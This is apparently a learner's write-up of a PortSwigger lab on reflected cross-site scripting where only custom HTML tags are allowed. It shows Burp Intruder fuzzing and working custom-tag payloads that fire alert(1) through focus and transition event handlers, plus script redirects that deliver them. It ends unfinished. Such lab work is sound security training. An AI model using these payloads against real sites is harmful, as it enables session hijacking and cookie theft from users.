# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.

# Step 1 Test search funtion for XSS

I find that if I search using html tags, that my output is reflected on the page:
![image](https://user-images.githubusercontent.com/83407557/211054613-0d8c6fb7-ac46-48b7-9c3e-3817e7b66c9a.png)
![image](https://user-images.githubusercontent.com/83407557/211054670-78a3702c-01c8-4baa-a846-43d1ee9f5020.png)

However any attempt to add known tags throws an error:

![image](https://user-images.githubusercontent.com/83407557/211054822-fc162e24-2602-471e-b34b-47ca803a27e7.png)
![image](https://user-images.githubusercontent.com/83407557/211054875-5b856ccd-6354-4e15-a0a2-6d971584058e.png)

# Step 2 Create an intruder attack using custom tags

I capture a test string with burp and send it to intruder:

![image](https://user-images.githubusercontent.com/83407557/211055319-7eb91c5b-a359-4ddb-9e32-405f7a839d6c.png)

I add a payload position on the string "test"

![image](https://user-images.githubusercontent.com/83407557/211055535-ee5d4dec-00fc-4fc8-b111-1c6de3dcfbf8.png)

Using the [Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) I select custom tags with all events, and copy payloads under Event handlesrs that do not require user interaction:

![image](https://user-images.githubusercontent.com/83407557/211057224-1a66daa8-4264-40b3-844d-b11e429bac22.png)

And add the copied payloads from this list into the payloads section of my intruder attack:

![image](https://user-images.githubusercontent.com/83407557/211057684-703cd62f-0c76-4fba-b534-0ea10fba33c3.png)

I find that three of the payloads returned 200 ok response codes:

![image](https://user-images.githubusercontent.com/83407557/211057929-cd2eb43e-02f5-441e-8a0b-7df76f5c048c.png)

```html
<xss id=x tabindex=1 onfocus=alert(1)></xss>

<xss id=x tabindex=1 onfocusin=alert(1)></xss>

<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
```

# Step 3 Create payloads 

Using the cheat sheet I can click on the links for each of these to view a POC:

![image](https://user-images.githubusercontent.com/83407557/211066414-71ff9942-884b-4a52-b493-5979f09eb2c4.png)

![image](https://user-images.githubusercontent.com/83407557/211066623-a5c1ee2c-63b9-41f8-98f3-857dfac53cf0.png)

Using this I can copy the payload parts of the URLs:

```html
<xss id%3Dx tabindex%3D1 onfocus%3Dalert(1)><%2Fxss>#x
  
<xss id%3Dx tabindex%3D1 onfocusin%3Dalert(1)><%2Fxss>#x
  
<xss id%3Dx style%3D"transition%3Aoutline 1s" ontransitionend%3Dalert(1) tabindex%3D1><%2Fxss>#x  
```


```html
<script>
  location = 'https://0af6001904e737f8c0f96d79008d007e.web-security-academy.net/?search=%3Cxss+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%23x%3C%2Fxss%3E';
</script>
```

```html
<script>
  location = 'https://0af6001904e737f8c0f96d79008d007e.web-security-academy.net//?search=%3Cxss+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%23x%3C%2Fxss%3E';
</script>
```

```html
<script>
  location = '/?search=%3Cxss+id%3Dx+style%3D%22transition%3Aoutline+1s%22+ontransitionend%3Dalert%281%29+tabindex%3D1%3E%3C%2Fxss%3E';
</script>
```

# Step 4 add payloads to attack server

I am going to try each payload in-turn on myself using the attack server:

![image](https://user-images.githubusercontent.com/83407557/211062177-07568575-4baf-4ce1-99ab-3b90fc824302.png)


Took a break, payloads work if you click on the example links of cheatsheet
